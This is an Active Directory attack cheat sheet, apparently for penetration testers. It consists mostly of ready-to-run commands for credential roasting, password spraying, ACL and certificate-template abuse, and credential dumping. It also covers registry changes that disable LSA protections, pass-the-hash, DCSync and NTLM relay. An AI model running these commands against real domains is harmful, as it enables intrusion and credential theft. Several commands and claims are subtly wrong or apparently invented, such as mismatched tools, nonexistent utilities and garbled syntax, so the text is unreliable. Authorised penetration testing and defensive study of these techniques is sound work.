# Active Directory

The single largest body of knowledge in offensive security, and the one that
most rewards patience over creativity. Almost every AD path is a chain of
individually boring misconfigurations.

## Contents

- [The mental model](#the-mental-model)
- [Enumeration](#enumeration)
- [Kerberos](#kerberos)
- [BloodHound](#bloodhound)
- [ACL abuse](#acl-abuse)
- [Credential attacks](#credential-attacks)
- [Lateral movement](#lateral-movement)
- [DCSync](#dcsync)
- [Delegation](#delegation)
- [Reporting AD findings](#reporting-ad-findings)

---

## The mental model

AD is a directory service. The only three things you are ever looking for:

1. **Who** — an account that means something
2. **What it can do** — privileges, group membership, ACLs on other objects
3. **How those connect** — a path from a weak account to Domain Admin

That third point is the whole job. BloodHound exists to draw it, because humans
cannot see it. Your entire objective is to find the shortest path and walk it.

**Two rules that prevent most wasted effort.** Trust the graph over your
intuition, and stop when you are Domain Admin rather than continuing for the
sake of it.

---

## Enumeration

```bash
# The domain name, the first thing you need and often the thing you have
netexec smb <target> -u '' -p '' --enum-users
netexec smb <target> -u '' -p '' --enum-shares
netconfig -k
enum4linux <target>
```

```bash
# DNS is the most reliable unauthenticated source
dig axfr <domain> @<dc>
dig <domain> NS +short
dig _ldap._tcp.<domain> SRV +short
dig _kerberos._tcp.<domain> SRV +short

# LDAP anonymous bind, when it is enabled
ldapsearch -x -H ldap://<dc> -b "DC=<domain>,DC=<tld>" -s base namingContexts
ldapsearch -x -H ldap://<dc> -b "DC=<domain>,DC=<tld>" "(objectClass=*)" memberOf
```

```bash
# With any valid credential
netexec ldap <dc> -u '<domain>/<user>' -p '<pass>' --query '(description=*Admin*)'
netexec ldap <dc> -u '<domain>/<user>' -p '<pass>' --enum-users
netexec ldap <dc> -u '<domain>/<user>' -p '<pass>' --enum-groups
ldapsearch -x -H ldap://<dc> -u '<domain>/<user>' -w '<pass>' \
  -b "DC=<domain>,DC=<tld>" "(objectClass=user)" sAMAccountName memberOf
```

```bash
# The SMB-based equivalents, because they often work where LDAP is filtered
netexec smb <dc> -u '<user>' -p '<pass>' --users
netexec smb <dc> -u '<user>' -p '<pass>' --groups
netexec smb <dc> -u '<user>' -p '<pass>' --local-users
```

```bash
# Automate it, then read the output
crackmapexec ldap <dc> -u users.txt -p passwords.txt --no-bruteforce
bloodhound-python -d <domain> -u '<user>' -p '<pass>' -o all
```

### What to write down

- Domain and Domain Controllers
- The Forest, and any trusts
- Group names, especially anything containing "Admin", "Service", or "Backup"
- Service accounts, and the naming convention that reveals them
- Every host you can reach with what you currently have

The naming convention matters more than people realise. `svc_sql01`, `svc_backup`,
`adm_pa` — a naming scheme tells you the service account format, which tells you
what to spray, which is the single highest-value thing you can learn about a
domain in the first ten minutes.

---

## Kerberos

The protocol behind most of AD authentication. Understanding three concepts
explains most AD vulnerabilities.

**The ticket-granting service (KDC)** issues tickets. The **ticket-granting
ticket (TGT)** is the one you hold. A **service ticket** is what you present to
a service.

### AS-REP roasting, pre-authentication disabled

Accounts that do not require pre-authentication return an encrypted ticket to
*anyone* who requests one, using their password as the key. You need no
credentials at all.

```bash
# Find them
netexec ldap <dc> -u users.txt -p '' --no-bruteforce --asrep-roast output.txt
# Impacket equivalent
GetUserSPNs.py <domain>/<dc> -no-pass -request

# Crack
hashcat -m 18200 output.txt /usr/share/wordlists/rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt output.txt
```

### Kerberoasting, a service ticket you can request legitimately

Any account with an SPN is crackable offline, because its password is the key
to the service ticket.

```bash
# Which accounts have SPNs
netexec ldap <dc> -u '<user>' -p '<pass>' --query '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
GetUserSPNs.py <domain>/<user>:<pass> -request

# Request and crack
netexec ldap <dc> -u '<user>' -p '<pass>' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# Rotating, so you get every service ticket in one pass
netexec ldap <dc> -u '<user>' -p '<pass>' --kerberoasting 'user.txt' 'pass.txt' --no-bruteforce
```

### Password spraying

Guessing one password against many accounts, rather than many passwords against
one. It is the method that respects and avoids account lockout.

```bash
# One password, many users. The correct shape of a spray.
netexec smb <dc> -u users.txt -p 'Summer2026!' --no-bruteforce
netexec smb <dc> -u users.txt -p 'Password123!' --no-bruteforce

# A small, realistic list beats a huge one
```

```bash
# Wordlists tuned to the environment beat generic ones
# "Password1!", "Welcome1", "<CompanyName>2026", "<the year>" are worth more
# than a million-line list against a domain that locks out.
ls /usr/share/seclists/Passwords/Default-Credentials/
```

```bash
# If you know the naming convention, generate candidates
# svc_<service><number>@<domain>
# j.<firstinitial><surname>@<domain>
# <firstname><lastname><year>@<domain>
```

---

## BloodHound

The tool that finds paths a human cannot see. Upload its output, then read the
graph.

```bash
# Collection
# netexec, the modern way, and it can be told to keep quiet
netexec smb <dc> -u '<user>' -p '<pass>' --bloodhound --bloodhound-output all -collection all

# bloodhound-python
bloodhound-python -d <domain> -u '<user>' -p '<pass>' -o all

# SharpHound on a Windows host you already own
.\SharpHound.exe --collection:All --domain <domain> <domain>
```

```bash
# Ingest it, either way
# neo4j import, or the BloodHound GUI drag-and-drop
./bloodhound-python -c neo4j://<neo4j>:7687 -u neo4j -p '<pass>' ...
```

### The queries that matter

Load these into the BloodHound query library and run them. Each finds a class of
path that is not obvious by reading.

| Query | Finds |
|---|---|
| Shortest path to Domain Admins | The answer, directly |
| All shortest paths to Domain Admins | Alternatives, in case the first is patched |
| Shortest path to a Domain Controller | Where to go next |
| Map all domain trust paths | Where you can reach beyond this domain |
| Find all principals with WriteDacl | The most abusable ACL |
| Find all principals with GenericAll | Another abusable ACL |
| Find all principals with WriteSPN | Kerberoastable accounts |
| Find principals with SeDebugPrivilege | Local privesc on any domain-joined host |
| Find hosts with SQL Server admin access | Database to domain, a classic |
| Find principals with DCSync rights | Immediate domain compromise |
| Find all ADCS templates | A very common 2023 to 2026 path |
| Find LAPS accounts | The account that can reset local admin passwords |

**Read the shortest path before you touch anything.** It tells you exactly which
two or three misconfigurations are the whole problem, and it stops you exploring
a DC while the real path is through a help desk account.

---

## ACL abuse

The most common way into a domain, and almost always a misconfiguration
somebody made deliberately without understanding the consequence.

| Right | What it lets you do |
|---|---|
| `GenericAll` | Full control. Change the password, add to groups, anything |
| `GenericWrite` | Set attributes, sometimes set a password |
| `WriteDacl` | Change the permissions, then give yourself `GenericAll` |
| `Owns` | Take ownership, then change the permissions |
| `WriteSPN` | Add an SPN, then kerberoast the account |
| `WriteMember` / `AddMember` | Add a principal you control to a privileged group |
| `WriteReparsePoint` | Redirect a stored credential, a newer and less understood path |

```bash
# Read the current ACL
ldapsearch -x -H ldap://<dc> -D '<user>' -w '<pass>' \
  -b "CN=<target>,DC=<domain>,DC=<tld>" '(objectClass=*)' nTSecurityDescriptor

# BloodHound shows the same data as a graph, which is why it is easier to read
```

```bash
# The Playbook for the attacks themselves
./Playbook.py -t <target> -u '<user>' -p '<pass>' -d <domain> --lookup sAMAccountName --bloodhound
# Specific techniques
.\Playbook.exe -t <target> -u '<user>' -p '<pass>' -p 'Add-Member' -d <domain>
.\Playbook.exe -t <target> -u '<user>' -p '<pass>' -p 'WriteDacl' -d <domain>
.\Playbook.exe -t <target> -u '<user>' -p '<pass>' -p 'WriteSPN' -d <domain>
```

```bash
# ADCS, which is the most exploited path in recent years
# A template that lets you request a certificate for any user, including
# a Domain Admin, and enrol it. BloodHound and the Certipy tool both find these.
certipy req -u '<user>' -p '<pass>' -target <dc> -ca '<CA-name>' -template 'User' -upn administrator@<domain> -dc-ip <dc-ip>
certipy auth -username administrator -password 'P@ssw0rd' -dc-ip <dc-ip>
```

```bash
# GPO abuse, where a domain account has rights over a Group Policy Object
# Often overlooked because it is not in the standard query set
# SharpGPOAbuse.exe
.\SharpGPOAbuse.exe -u '<user>' -p '<pass>' -t <dc> -k "CN=<gpo>,DC=<domain>,DC=<tld>"
```

---

## Credential attacks

```bash
# Dump from a compromised host, in this order of preference
# 1. SAM and NTDS, if you have the rights
secretsdump.py -local -sam LOCAL Administrator
secretsdump.py <domain>/<dc> -hashes 'sam' 'ntds'

# 2. LAPS, if present. An account that can read LAPS can reset
#    local administrator passwords across the estate.
.\Windows\LAPS\Legacy\LAPSUI.exe /reset
```

```bash
# Credential Manager, which people forget
cmdkey /list
```

```bash
# PowerShell history
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```bash
# Unattend and provisioning, where setup passwords are left behind
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\unattend\Unattend.xml
```

```bash
# DPAPI, which decrypts any user's saved credentials as that user
# It is a real feature, not a vulnerability
secretsdump.py <domain>/<user>:<pass>@<target> -dpapi
```

```bash
# The databases worth checking, because they hold domain credentials
# MSSQL: the service account, often with domain rights
netexec mssql <target> -u '<user>' -p '<pass>' -q "SELECT SYSTEM_USER"
# Postgres
netexec postgres <target> -u '<user>' -p '<pass>' -q "SELECT current_user"
# Redis, MySQL, and MongoDB in the same pattern
```

```bash
# Pass the hash, so you never need to crack
netexec smb <dc> -u '<user>' -H '<ntlm-hash>' --no-bruteforce
psexec.py -hashes :<ntlm-hash> '<domain>/<user>@<target>'
wmiexec.py -hashes :<ntlm-hash> '<domain>/<user>@<target>'
evil-winrm -u '<user>' -H '<hash>' -i <target>
```

```bash# On the attacker machine, enable WDigest unless the domain blocks it
# It is disabled by default on Windows Server 2012 and later, which is
# why GetNTLMHashes often returns nothing
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# The modern equivalent. A reboot is required.
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

```bash
# NTLM hash format. A colon between the two halves, uppercase LM:NT.
# This is what hashcat wants.
./mimikatz.exe sekurlsa::logonpasswords
lsadump::secrets
lsadump::lsa /inject
```

```bash
# Crack offline, so no lockout and no noise
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt       # NTLM
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt     # AS-REP
hashcat -m 13100 tgs.txt /usr/share/wordlists/rockyou.txt       # Kerberoast
hashcat -m 1600 netntlm.txt /usr/share/wordlists/rockyou.txt    # Responder capture
hashcat --example-hashes
```

```bash
# Crack a Kerberoast ticket without knowing the account, when the output lacks a username
hashcat -m 13100 --username <user> kerb.txt /usr/share/wordlists/rockyou.txt
```

---

## Lateral movement

```bash
# Remote execution, chosen by what the target allows
# WinRM, the cleanest where it is open
evil-winrm -i <target> -u '<user>' -p '<pass>'
evil-winrm -i <target> -u '<user>' -H '<hash>'
# Then
hashdump
```

```bash
# SMB admin share
netexec smb <target> -u '<user>' -p '<pass>' -x 'whoami'
netexec smb <target> -u '<user>' -p '<pass>' -x 'type C:\Users\Administrator\Desktop\proof.txt'
# PsExec
psexec.py -hashes :<hash> '<domain>/<admin>@<target>'
# WMIC
wmiexec.py -hashes :<hash> '<domain>/<admin>@<target>'
# Noisy, but ubiquitous
```

```bash
# Dump the local SAM on the new host, which may not be domain creds
netexec smb <target> -u '<user>' -p '<pass>' --local-users
secretsdump.py -local -sam LOCAL Administrator
```

```bash
# Where to go next. The loop that finds most of an engagement.
# 1. You have creds for a host
# 2. That host can reach another host
# 3. The second host has a different set of creds
# 4. Repeat, keeping notes
#
# BloodHound and the pivoting sheet cover the mechanics of step 2.
```

```bash
# Group Policy Preferences, which store credentials in a recoverable form
# cpassword. Worth checking on any domain-joined host.
```

```bash
# Services running with domain creds, the most common lateral path
tasklist /svc
# sc query, and then the binary path, and then whether the path is writable
```

---

## DCSync

Complete domain compromise, and it needs nothing more than two rights on a
domain controller: `ReplicationGetChanges` and `ReplicationGetChangesAll`. Any
account with them, or with `GenericAll` or `FullControl` on the domain object,
can replicate the whole directory.

```bash
# Requires the rights. They are the finding, not the attack.
secretsdump.py -domain <domain> -hashes 'krbtgt' <dc>
netexec smb <dc> -H '<ntlm-hash>' --local-auth --ntlm
# With a ticket rather than a hash
secretsdump.py -k -domain <domain> <dc>
```

```bash
# krbtgt is the key to every service ticket in the domain
# Two golden tickets from one krbtgt means you can forge any ticket
# and no password change will stop it
```

---

## Delegation

Where a legitimately authenticated request is stolen or forged. High impact,
and worth knowing because it is frequently enabled by accident.

| Configuration | Risk |
|---|---|
| Unconstrained delegation | Any ticket that reaches the host can be read. A classic relay-to-admin path |
| Constrained delegation | You can get service tickets for services you are not permitted to use |
| `msDS-AllowedToDelegateTo` | A specific delegation the account was never meant to have |
| `SeTcbPrivilege` | Can act as part of the OS, which makes a relay trivial |

```bash
# Find accounts trusted for delegation
netexec ldap <dc> -u '<user>' -p '<pass>' --query '(&(objectClass=user)(msDS-AllowedToDelegateTo=*))' sAMAccountName msDS-AllowedToDelegateTo
netexec ldap <dc> -u '<user>' -p '<pass>' --query '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))' sAMAccountName
# 524288 is the UserTrustedForDelegation flag
```

```bash
# NTLM relay, and whether it is possible
# Depends on three things, all of which you should check rather than assume
# 1. Signing: is it required?
# 2. LDAP signing: is it required?
# 3. Channel binding: is it enforced?
# If any is not enforced, relay may be viable, and that is a real finding.
nmap -p 445 --script smb2-security-mode <target>
nmap -p 389 --script ldap-rootdse <target>
crackmapexec ldap <dc> -u '<user>' -p '<pass>' --get-tgt
```

**Set up a relay server only with written permission.** It requires modifying
your own machine's registry to enable insecure negotiation, and in a client
environment you may need to configure a listener on their infrastructure. That
is a change to their systems, so it belongs in the rules of engagement rather
than in a checkbox.

```bash
# If it is agreed
impacket-ntlmrelayx -t ldaps://<dc> -smb2support
ntlmrelayx.py -t ldaps://<dc> -smb2support
# Interception on your own network, to capture hashes
Responder.py -I eth0 -v
```

```bash
# Validate the target's protections
.\RunAsAdmin.exe
.\ PetitPotam.exe
# The genuine article, modern systems
nltest /domain:<domain> /validate
```

---

## Reporting AD findings

An AD finding without its path is nearly worthless, because the client cannot
prioritise it. Always report the chain.

> `j.smith@corp.local` is a member of `Domain Admins` through membership in
> `HelpDesk-Privileged`, which has `GenericWrite` on the `IT-Operators` group.
> `HelpDesk-Privileged` reaches Domain Admin in two hops. The path is
> `j.smith -> HelpDesk-Privileged -> IT-Operators -> Domain Admins`, visible in
> the attached BloodHound graph.

Include:

- The exact path, as a graph screenshot and as text
- The specific ACL or privilege that permits each hop
- What a low-privilege account gains, and how many hops it takes
- The recommended fix for each link, not just the last one
- Whether the path was already known or remediated previously

A single "user is in Domain Admins" finding is a configuration problem. A path
from a help desk account to Domain Admin is a compromise waiting to happen, and
that is the framing that gets it fixed this week rather than next quarter.
